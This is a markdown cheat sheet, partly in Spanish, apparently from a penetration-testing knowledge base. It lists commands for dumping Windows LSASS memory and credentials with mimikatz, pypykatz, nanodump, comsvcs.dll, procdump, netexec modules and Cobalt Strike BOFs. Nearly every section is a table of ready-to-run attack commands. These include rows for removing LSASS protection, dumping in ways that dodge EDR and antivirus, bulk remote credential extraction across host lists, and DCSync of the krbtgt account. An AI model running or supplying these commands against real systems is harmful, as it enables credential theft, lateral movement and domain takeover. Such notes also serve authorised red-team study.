---
aliases:
  - LSASS Tooling
  - mimikatz
  - pypykatz
  - nanodump
tags:
  - type/tool
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: Tool
linked:
  - '[[LSASS Dumping]]'
---
# LSASS Dumping - Tooling

***

## mimikatz (Windows on-host)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # privilege::debug` | SeDebugPrivilege | Pre-everything. |
| `mimikatz # sekurlsa::logonpasswords` | NTLM + cleartext + Kerberos | Standard. |
| `mimikatz # sekurlsa::msv` | Solo NTLM | Targeted. |
| `mimikatz # sekurlsa::ekeys` | AES keys | Modern. |
| `mimikatz # sekurlsa::tickets /export` | Export TGT/TGS | Pre-PtT. |
| `mimikatz # sekurlsa::wdigest` | Cleartext (legacy) | Edge. |
| `mimikatz # sekurlsa::credman` | Credential Manager | Bonus. |
| `mimikatz # lsadump::sam` | Local SAM | Local. |
| `mimikatz # lsadump::secrets` | LSA Secrets | Service accounts. |
| `mimikatz # lsadump::cache` | mscash | Offline crack. |
| `mimikatz # sekurlsa::minidump <lsass.dmp>` | Load offline dump | Pre-parse. |
| `mimikatz # !+` | Load mimidrv.sys driver | RunAsPPL bypass. |
| `mimikatz # !processprotect /process:lsass.exe /remove` | Remove LSASS protection | Post-driver. |
^lsass-tool-mimi

___

## pypykatz (Linux/Mac offline)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `pypykatz lsa minidump lsass.dmp` | Parse dump | Standard offline. |
| `pypykatz lsa minidump lsass.dmp -k tickets/` | Export tickets | Pre-PtT. |
| `pypykatz lsa minidump lsass.dmp -o creds.txt` | Output file | Pipeline. |
| `pypykatz lsa minidump lsass.dmp --json` | JSON | Programmatic. |
| `pypykatz registry --system SYSTEM SAM` | Local SAM | Local hashes. |
| `pypykatz registry --system SYSTEM SECURITY` | LSA Secrets | Service. |
| `pypykatz dpapi credential <encrypted-blob>` | DPAPI decrypt | Browser pwds. |
^lsass-tool-pypykatz

```bash
pip install pypykatz
pypykatz lsa minidump lsass.dmp -o creds.txt -k tickets/
```

___

## nanodump

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nanodump.exe -w lsass.dmp -v` | Standard valid dump | Default. |
| `nanodump.exe --fork -w lsass.dmp` | Fork process method | EDR bypass. |
| `nanodump.exe --snapshot -w lsass.dmp` | Process snapshot API | Stealth. |
| `nanodump.exe --duplicate -w lsass.dmp` | Duplicate handle | Stealth. |
| `nanodump.exe -d -w lsass.dmp` | Invalid signature dump | Avoid AV scan. |
| BOF version (Cobalt Strike) | In-process inline | Beacon. |
^lsass-tool-nanodump

```cmd
:: Download nanodump.exe del github
:: https://github.com/fortra/nanodump

nanodump.exe -w C:\temp\lsass.dmp -v
nanodump.exe --duplicate -w C:\temp\lsass.dmp
```

___

## Native LOLBins

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full` | Native MiniDump | Stealth. |
| `procdump.exe -accepteula -ma lsass.exe lsass.dmp` | Sysinternals signed | Standard. |
| `procdump.exe -accepteula -ma lsass.exe lsass.dmp -h` | Snapshot mode | Modern. |
| Task Manager → Right-click LSASS → Create dump file | GUI native | Interactive. |
| `SQLDUMPER.EXE` (Office/SQL) | Microsoft-signed dumper | LOLBin alt. |
| `WerFault.exe -u -p <PID> -s 0` | Error reporting dump | Edge. |
| `vssadmin create shadow /for=C:` | VSS snapshot (DC NTDS path) | Adjacent. |
^lsass-tool-lolbin

___

## netexec / crackmapexec Modules

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <target> -u u -p p -M lsassy` | Remote LSASS dump via SMB (drops + dumps) | Lateral cred extract. |
| `nxc smb <target> -u u -p p -M comsvcs` | comsvcs.dll method via SMB | Stealth lateral. |
| `nxc smb <target> -u u -p p -M nanodump` | nanodump module | Modern. |
| `nxc smb <target> -u u -p p -M handlekatz` | Handle-based dumper | EDR-friendly. |
| `nxc smb <target> -u u -p p --sam` | Remote SAM dump (no LSASS) | Local hashes only. |
| `nxc smb <target> -u u -p p --lsa` | LSA Secrets remote | Service accounts. |
^lsass-tool-nxc

```bash
# Bulk LSASS dump
nxc smb hosts.txt -u admin -H <NT> --local-auth -M lsassy
# Output: hashes parseados directo desde host
```

___

## Cobalt Strike BOFs

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz!sekurlsa::logonpasswords` | In-process Mimikatz BOF | CS standard. |
| `nanodump --write lsass.dmp` (BOF) | Custom dumper inline | Modern stealth. |
| `lsadump dcsync /domain:corp.local /user:krbtgt` | DCSync via BOF | Adjacent. |
^lsass-tool-bof

___

## SafetyKatz / Custom .NET

| **Tool** | **URL** | **Cuándo** |
|:---:|:---:|:---:|
| SafetyKatz | `https://github.com/GhostPack/SafetyKatz` | Renombrado mimikatz. |
| SharpSecDump | `https://github.com/G0ldenGunSec/SharpSecDump` | Remote secretsdump-style. |
| Out-Minidump (Empire) | PS-based dumper | Legacy. |
| DInjector | Custom DLL injector con direct syscalls | Advanced. |
^lsass-tool-custom

___

## DPAPI Tooling Adjacent

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::dpapi` | DPAPI master keys (offline) | Pre-decrypt. |
| `impacket-dpapi masterkey -file <encrypted-master> -mkfile <key>` | Decrypt master key | Linux. |
| `pypykatz dpapi credential <blob>` | Decrypt credential blob | Linux. |
| `SharpDPAPI` | C# DPAPI extraction | Modern Windows. |
^lsass-tool-dpapi

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| Mimikatz | `https://github.com/gentilkiwi/mimikatz` |
| pypykatz | `https://github.com/skelsec/pypykatz` |
| nanodump | `https://github.com/fortra/nanodump` |
| SafetyKatz | `https://github.com/GhostPack/SafetyKatz` |
| HackTricks LSASS | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/lsass-secrets-dumping` |
| The Hacker Recipes — LSASS | `https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass` |
| Microsoft LSA Protection | `https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection` |
| Credential Guard docs | `https://learn.microsoft.com/windows/security/identity-protection/credential-guard/credential-guard` |
| MITRE ATT&CK T1003.001 | `https://attack.mitre.org/techniques/T1003/001/` |
^lsass-tool-resources

***
